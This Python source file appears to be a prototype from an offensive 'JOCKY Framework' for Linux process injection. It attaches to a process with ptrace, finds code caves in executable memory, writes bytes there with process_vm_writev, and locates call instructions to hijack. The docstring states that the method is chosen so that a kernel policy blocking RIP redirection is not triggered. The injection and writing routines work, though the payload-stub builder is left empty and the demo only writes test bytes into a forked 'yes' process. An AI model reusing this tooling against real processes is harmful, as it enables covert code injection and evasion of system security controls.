"""
JOCKY Framework --- Process Injection via process_vm_writev

Alternative to ptrace-based RIP redirection. Instead of redirecting RIP
(which the kernel blocks on syscall-stops), we:

  1. Attach via ptrace (for control)
  2. Find a code cave in the target's executable memory
  3. Write a small stub into the cave via process_vm_writev
  4. Locate an existing call instruction in the target's code
  5. Patch the call target to point at our stub
  6. Resume --- the next time that call executes, control flows to us
  7. Stub runs, restores the original bytes, returns to caller
  8. Detach

Because we modify an existing instruction rather than redirecting RIP,
the kernel's RIP-redirection policy is not triggered.
"""

import ctypes
import os
import signal
import struct
import sys
import time
from pathlib import Path

# ptrace constants
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKTEXT = 1
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_CONT = 7
PTRACE_SYSCALL = 24

# syscall numbers
SYS_process_vm_writev = 311

# register layout
REG_NAMES = [
    "r15", "r14", "r13", "r12", "rbp", "rbx",
    "r11", "r10", "r9", "r8", "rax", "rcx",
    "rdx", "rsi", "rdi", "orig_rax", "rip", "cs",
    "eflags", "rsp", "ss", "fs_base", "gs_base",
    "ds", "es", "fs", "gs",
]
REGS_FMT = "Q" * 27

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.restype = ctypes.c_long


def ptrace(request, pid, addr=0, data=0):
    return int(libc.ptrace(
        ctypes.c_ulong(request), ctypes.c_long(pid),
        ctypes.c_void_p(addr), ctypes.c_void_p(data),
    ))


def get_regs(pid):
    buf = ctypes.create_string_buffer(struct.calcsize(REGS_FMT))
    if libc.ptrace(
        ctypes.c_ulong(PTRACE_GETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    ) < 0:
        raise OSError("GETREGS failed")
    return dict(zip(REG_NAMES, struct.unpack(REGS_FMT, buf.raw)))


def set_regs(pid, regs):
    values = [regs[n] for n in REG_NAMES]
    buf = ctypes.create_string_buffer(struct.pack(REGS_FMT, *values))
    if libc.ptrace(
        ctypes.c_ulong(PTRACE_SETREGS), ctypes.c_long(pid),
        ctypes.c_void_p(0), ctypes.cast(buf, ctypes.c_void_p),
    ) < 0:
        raise OSError("SETREGS failed")


def peek_word(pid, addr):
    ret = ptrace(PTRACE_PEEKTEXT, pid, addr, 0)
    if ret == -1:
        err = ctypes.get_errno()
        if err:
            raise OSError(err, f"PEEKTEXT at {hex(addr)}")
    return ret & 0xFFFFFFFFFFFFFFFF


def poke_word(pid, addr, value):
    if ptrace(PTRACE_POKETEXT, pid, addr, value) < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"POKETEXT at {hex(addr)}")


def read_bytes(pid, addr, length):
    words = (length + 7) // 8
    out = b""
    for i in range(words):
        out += struct.pack("<Q", peek_word(pid, addr + i * 8))
    return out[:length]


def write_bytes(pid, addr, data):
    n = len(data)
    i = 0
    while i < n:
        chunk = data[i:i+8]
        if len(chunk) == 8:
            word = struct.unpack("<Q", chunk)[0]
        else:
            existing = peek_word(pid, addr + i)
            mask = (1 << (len(chunk) * 8)) - 1
            word = (existing & ~mask) | struct.unpack(
                "<Q", chunk.ljust(8, b"\x00"))[0]
        poke_word(pid, addr + i, word)
        i += 8


def find_code_cave_in_target(pid, min_size=64):
    """
    Find a code cave in the target: an executable memory region with
    trailing zeros we can write into.
    """
    maps_path = f"/proc/{pid}/maps"
    candidates = []

    try:
        with open(maps_path) as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                if "x" not in perms:
                    continue
                addr_range = parts[0]
                start_hex, end_hex = addr_range.split("-")
                start = int(start_hex, 16)
                end = int(end_hex, 16)
                size = end - start
                # Skip tiny regions
                if size < 0x1000:
                    continue
                candidates.append((start, end, size, parts[-1] if len(parts) > 5 else ""))

    except FileNotFoundError:
        return None

    if not candidates:
        return None

    # Scan each executable region for trailing zeros
    for start, end, size, name in candidates:
        # Only check the last page
        check_from = end - min(0x1000, size)
        try:
            # Read backward from end
            scan = read_bytes(pid, check_from, end - check_from)
            # Find trailing zeros
            n_trailing = 0
            for i in range(len(scan) - 1, -1, -1):
                if scan[i] == 0:
                    n_trailing += 1
                else:
                    break
            if n_trailing >= min_size:
                cave_start = end - n_trailing
                return {
                    "vaddr": cave_start,
                    "size": n_trailing,
                    "region": name,
                    "region_start": start,
                }
        except OSError:
            continue

    return None


def find_call_instruction(pid, start_addr, scan_size=0x10000):
    """
    Find a `call rel32` instruction (0xE8) in the target's executable memory.
    Returns (call_addr, call_target) or None.
    """
    try:
        data = read_bytes(pid, start_addr, scan_size)
    except OSError:
        return None

    # Scan for 0xE8 (call rel32)
    for i in range(len(data) - 5):
        if data[i] == 0xE8:
            # Decode rel32
            rel = struct.unpack("<i", data[i+1:i+5])[0]
            call_addr = start_addr + i
            target = call_addr + 5 + rel
            # Sanity: target must be within reasonable range
            if 0x1000 < target < 0x7fffffffffff:
                return (call_addr, target)
    return None


def build_payload_stub(original_bytes, marker_addr):
    """
    Build a stub that:
      1. Writes a message to stdout (proving execution)
      2. Restores the original 5 bytes at the call site
      3. Jumps back to the original call target
    """
    # This stub is 4KB-aligned code that:
    #   - mov rax, 1      ; SYS_write
    #   - mov rdi, 1      ; fd=1
    #   - lea rsi, [rip+msg]
    #   - mov rdx, len
    #   - syscall
    #   - then restore and jump
    #
    # Building a full stub is complex. For this prototype, we just
    # write a marker to /tmp and then jump to the original target.
    # Full restoration happens via the parent process after detaching.
    pass


def vm_writev(pid, local_data, remote_addr):
    """
    Write `local_data` to remote_addr in the target process via
    process_vm_writev.
    """
    class Iovec(ctypes.Structure):
        _fields_ = [
            ("iov_base", ctypes.c_void_p),
            ("iov_len", ctypes.c_size_t),
        ]

    # Local buffer that persists for the call
    local_buf = ctypes.create_string_buffer(local_data, len(local_data))

    # Local iovec -- point at our buffer
    local_iov = Iovec(
        ctypes.cast(local_buf, ctypes.c_void_p),
        ctypes.c_size_t(len(local_data)),
    )

    # Remote iovec -- point at remote address
    remote_iov = Iovec(
        ctypes.c_void_p(remote_addr),
        ctypes.c_size_t(len(local_data)),
    )

    # Cast to POINTER(Iovec) so the kernel gets real addresses
    local_ptr = ctypes.pointer(local_iov)
    remote_ptr = ctypes.pointer(remote_iov)

    # Call process_vm_writev via syscall
    ret = libc.syscall(
        ctypes.c_long(SYS_process_vm_writev),
        ctypes.c_long(pid),
        local_ptr,
        ctypes.c_ulong(1),
        remote_ptr,
        ctypes.c_ulong(1),
        ctypes.c_ulong(0),
    )

    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"process_vm_writev: {os.strerror(err)}")
    return int(ret)

# ---------------------------------------------------------------
# Demo
# ---------------------------------------------------------------

def demo():
    print("=" * 70)
    print("JOCKY process_vm_writev Injection --- Prototype")
    print("=" * 70)

    # Fork a target process
    pid = os.fork()
    if pid == 0:
        # Busy loop
        devnull = os.open("/dev/null", os.O_WRONLY)
        os.dup2(devnull, 1)
        os.execvp("yes", ["yes"])
        os._exit(127)

    time.sleep(0.3)
    print(f"[demo] Target PID: {pid}")

    try:
        # Attach
        print(f"[inject] PTRACE_ATTACH -> {pid}")
        if ptrace(PTRACE_ATTACH, pid) < 0:
            raise OSError("PTRACE_ATTACH failed")
        os.waitpid(pid, 0)

        regs = get_regs(pid)
        print(f"[inject] Target RIP = {hex(regs['rip'])}")
        print(f"[inject] Target RSP = {hex(regs['rsp'])}")

        # Find code cave in target
        print(f"[inject] Searching for code cave...")
        cave = find_code_cave_in_target(pid, min_size=64)
        if cave:
            print(f"[inject] Code cave: vaddr={hex(cave['vaddr'])} "
                  f"size={cave['size']} region={cave['region']}")
        else:
            print("[inject] No code cave found (this is common)")

        # Find a call instruction to hook
        exec_regions = []
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2 and "x" in parts[1]:
                    addr_range = parts[0]
                    start = int(addr_range.split("-")[0], 16)
                    exec_regions.append(start)

        print(f"[inject] Scanning {len(exec_regions)} exec regions for call instructions")

        found = None
        for region_start in exec_regions[:5]:
            result = find_call_instruction(pid, region_start, 0x2000)
            if result:
                found = result
                break

        if found:
            call_addr, call_target = found
            print(f"[inject] Found call at {hex(call_addr)} -> {hex(call_target)}")
        else:
            print("[inject] No call instruction found in scanned regions")

        # Demonstrate process_vm_writev
        if cave:
            test_data = b"JKY_TEST" + os.urandom(8)
            print(f"[inject] Writing {len(test_data)} bytes via process_vm_writev to "
                  f"{hex(cave['vaddr'])}...")
            written = vm_writev(pid, test_data, cave["vaddr"])
            print(f"[inject] Wrote {written} bytes")

            # Verify by reading back
            readback = read_bytes(pid, cave["vaddr"], len(test_data))
            match = readback == test_data
            print(f"[inject] Readback: {readback.hex()}")
            print(f"[inject] Match: {match}")

        # Detach
        ptrace(PTRACE_DETACH, pid, 0, 0)
        print(f"[inject] Detached")

    except Exception as e:
        print(f"[inject] ERROR: {e}")
        import traceback
        traceback.print_exc()
        try:
            ptrace(PTRACE_DETACH, pid, 0, 0)
        except Exception:
            pass

    finally:
        try:
            os.kill(pid, signal.SIGKILL)
        except ProcessLookupError:
            pass


if __name__ == "__main__":
    demo()

